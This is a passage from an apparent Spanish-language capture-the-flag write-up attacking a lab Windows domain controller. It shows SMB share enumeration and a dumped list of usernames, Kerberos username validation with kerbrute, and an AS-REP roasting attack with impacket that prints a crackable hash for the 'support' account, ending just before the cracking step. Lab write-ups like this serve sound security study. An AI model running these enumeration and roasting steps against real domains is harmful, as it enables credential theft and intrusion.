|   <span class="nb">date</span>: 2024-04-20T08:05:53
|_  start_date: N/A
|_clock-skew: 6h59m59s
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Estamos ante un DC.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.126.69
SMB         10.129.126.69   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver si hay recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbmap <span class="nt">-H</span> 10.129.126.69 <span class="nt">-u</span> <span class="s1">'miguelito'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.126.69:445	Name: 10.129.126.69       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share
	profiles<span class="nv">$ </span>                                        	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share
</code></pre></div></div>

<ul>
  <li>Tenemos privilegio de lectura en <code class="language-plaintext highlighter-rouge">profiles$</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbmap <span class="nt">-H</span> 10.129.126.69 <span class="nt">-u</span> <span class="s1">'miguelito'</span> <span class="nt">-r</span> <span class="s1">'profiles$'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.126.69:445	Name: 10.129.126.69       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share
	profiles<span class="nv">$ </span>                                        	READ ONLY	
	./profiles<span class="err">$</span>
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	<span class="nb">.</span>
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	..
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AAlleni
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABarteski
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABekesz
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABenzies
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABiemiller
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AChampken
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ACheretei
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ACsonaki
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AHigchens
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AJaquemai
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKlado
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKoffenburger
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKollolli
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKruppe
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKubale
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ALamerz
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AMaceldon
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AMasalunga
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ANavay
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ANesterova
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ANeusse
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AOkleshen
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	APustulka
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ARotella
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ASanwardeker
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AShadaia
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ASischo
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ASpruce
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ATakach
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ATaueg
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ATwardowski
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	audit2020
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AWangenheim
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AWorsey
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AZigmunt
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BBakajza
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BBeloucif
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BCarmitcheal
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BConsultant
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BErdossy
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BGeminski
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BLostal
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BMannise
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BNovrotsky
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BRigiero
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BSamkoses
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BZandonella
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CAcherman
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CAkbari
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CAldhowaihi
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CArgyropolous
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CDufrasne
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CGronk
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	Chiucarello
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	Chiuccariello
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CHoytal
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CKijauskas
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CKolbo
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CMakutenas
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CMorcillo
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CSchandall
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CSelters
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CTolmie
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DCecere
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DChintalapalli
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DCwilich
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DGarbatiuc
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DKemesies
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DMatuka
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DMedeme
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DMeherek
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DMetych
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DPaskalev
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DPriporov
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DRusanovskaya
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DVellela
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DVogleson
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DZwinak
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	EBoley
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	EEulau
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EFeatherling
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EFrixione
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EJenorik
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EKmilanovic
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ElKatkowsky
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EmaCaratenuto
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EPalislamovic
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EPryar
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ESachhitello
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ESariotti
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ETurgano
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EWojtila
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FAlirezai
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FBaldwind
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FBroj
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FDeblaquire
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FDegeorgio
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FianLaginja
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FLasokowski
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FPflum
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FReffey
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GaBelithe
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	Gareld
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GBatowski
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GForshalger
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GGomane
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GHisek
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GMaroufkhani
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GMerewether
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GQuinniey
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GRoswurm
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GWiegard
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HBlaziewske
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HColantino
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HConforto
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HCunnally
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HGougen
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HKostova
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	IChristijr
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	IKoledo
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	IKotecky
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ISantosi
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JAngvall
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JBehmoiras
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JDanten
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JDjouka
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JKondziola
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JLeytushsenior
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JLuthner
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JMoorehendrickson
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JPistachio
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JScima
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JSebaali
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JShoenherr
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JShuselvt
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KAmavisca
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KAtolikian
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KBrokinn
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KCockeril
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KColtart
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KCyster
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KDorney
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KKoesno
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KLangfur
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KMahalik
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KMasloch
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KMibach
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KParvankova
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KPregnolato
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KRasmor
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KShievitz
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KSojdelius
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KTambourgi
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KVlahopoulos
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KZyballa
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBajewsky
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBaligand
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBarhamand
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBirer
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBobelis
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LChippel
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LChoffin
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LCominelli
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LDruge
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LEzepek
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LHyungkim
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LKarabag
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LKirousis
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LKnade
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LKrioua
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LLefebvre
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LLoeradeavilez
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LMichoud
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LTindall
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LYturbe
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MArcynski
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MAthilakshmi
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MAttravanam
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MBrambini
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MHatziantoniou
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MHoerauf
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MKermarrec
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MKillberg
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MLapesh
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MMakhsous
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MMerezio
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MNaciri
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MShanmugarajah
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MSichkar
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MTemko
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MTipirneni
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MTonuri
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MVanarsdel
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NBellibas
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NDikoka
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NGenevro
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NGoddanti
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NMrdirk
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NPulido
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NRonges
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NSchepkie
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NVanpraet
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	OBelghazi
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	OBushey
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	OHardybala
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	OLunas
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ORbabka
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PBourrat
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PBozzelle
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PBranti
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PCapperella
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PCurtz
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PDoreste
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PGegnas
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PMasulla
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PMendlinger
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PParakat
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PProvencer
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PTesik
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PVinkovich
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PVirding
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PWeinkaus
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RBaliukonis
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RBochare
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RKrnjaic
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RNemnich
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RPoretsky
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RStuehringer
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RSzewczuga
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RVallandas
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RWeatherl
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RWissor
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SAbdulagatov
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SAjowi
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SAlguwaihes
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SBonaparte
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SBouzane
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SChatin
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SDellabitta
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SDhodapkar
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SEulert
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SFadrigalan
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SGolds
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SGrifasi
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SGtlinas
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SHauht
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SHederian
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SHelregel
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SKrulig
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SLewrie
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SMaskil
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	Smocker
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SMoyta
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SRaustiala
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SReppond
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SSicliano
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SSilex
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SSolsbak
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	STousignaut
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	support
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	svc_backup
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SWhyte
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SWynigear
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TAwaysheh
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TBadenbach
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TCaffo
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TCassalom
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TEiselt
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TFerencdo
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TGaleazza
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TKauten
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TKnupke
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TLintlop
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TMusselli
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TOust
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TSlupka
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TStausland
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TZumpella
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	UCrofskey
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	UMarylebone
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	UPyrke
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VBublavy
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VButziger
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VFuscca
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VLitschauer
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VMamchuk
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VMarija
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VOlaosun
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VPapalouca
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	WSaldat
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	WVerzhbytska
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	WZelazny
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XBemelen
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XDadant
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XDebes
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XKonegni
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XRykiel
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YBleasdale
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YHuftalin
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YKivlen
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YKozlicki
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YNyirenda
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YPredestin
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YSeturino
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YSkoropada
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YVonebers
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YZarpentine
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZAlatti
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZKrenselewski
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZMalaab
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZMiick
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZScozzari
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZTimofeeff
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZWausik
	SYSVOL                                            	NO ACCESS	Logon server share
</code></pre></div></div>

<ul>
  <li>Al parecer son nombres de usuarios de todos estos usuarios debemos ver cuantos de esos son verdaderos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbmap <span class="nt">-H</span> 10.129.126.69 <span class="nt">-u</span> <span class="s1">'miguelito'</span> <span class="nt">-r</span> <span class="s1">'profiles$'</span> <span class="nt">--no-banner</span> | <span class="nb">awk</span> <span class="s1">'NF{print $NF}'</span> <span class="o">&gt;</span> ../content/users.txt
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a usar <a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a> para validar los usuarios.</p>
  </li>
  <li>
    <p>Vamos agregar el nombre del dominio al <strong>/etc/hosts</strong>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">echo</span> <span class="s2">"10.129.126.69 BLACKFIELD.local blackfield.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.129.126.69 BLACKFIELD.local blackfield.local
</code></pre></div></div>

<ul>
  <li>Ahora validamos los usuarios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content /opt/kerbrute_linux_amd64 userenum <span class="nt">--dc</span> 10.129.126.69 <span class="nt">-d</span> blackfield.local users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 04/19/24 - Ronnie Flathers @ropnop

2024/04/19 19:20:59 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/04/19 19:20:59 <span class="o">&gt;</span>  	10.129.126.69:88

2024/04/19 19:21:19 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 audit2020@blackfield.local
2024/04/19 19:23:14 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 support@blackfield.local
2024/04/19 19:23:19 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 svc_backup@blackfield.local
2024/04/19 19:23:45 <span class="o">&gt;</span>  Done! Tested 315 usernames <span class="o">(</span>3 valid<span class="o">)</span> <span class="k">in </span>166.123 seconds
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora vamos hacer un <code class="language-plaintext highlighter-rouge">ASREPRoast Attack</code> con los usuarios validos que tenemos <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#asreproast">https://zer1t0.gitlab.io/posts/attacking_ad/#asreproast</a>.</p>
  </li>
  <li>
    <p>Tenemos el hash del usuario <code class="language-plaintext highlighter-rouge">support</code> ya que no tiene activado el <code class="language-plaintext highlighter-rouge">UF_DONT_REQUIRE_PREAUTH</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers blackfield.local/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> valid_users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] User audit2020 doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:0eabfacfb6de7f81120e4c162e0e1df9$2035e324a36e8b827defd1956fca64c98a164419f038369d586c107605a9aca2cf7ae0690a7e573446eb7d609ee6b584986de2d19383bc16f45a4872baa6239ab9e9d36e9704533f714a89ef6f6f3d9c956c6474ffcc127e0979e7cb60d9b55a2e031cc45370a9e9bf16f3dffccab5d7e838a39dd7be656a598d9f153cf0d7bc5a979cdf621b5d6e02bd483edb4284ad986bd55a0295f22a6dcc199135aa5886c782f448b78a711dcb32899edf17dccaa02b5d289564c88b022d4a25ac779d44b1c3ce5e96cdc41c417955a757506294434272fb38e386f507e062a3bb49b288ed2167d970cc81969e31fc1d307cebcf659123e0
[-] User svc_backup doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
</code></pre></div></div>

<ul>
  <li>Vamos a crackear el hash.</li>
</ul>

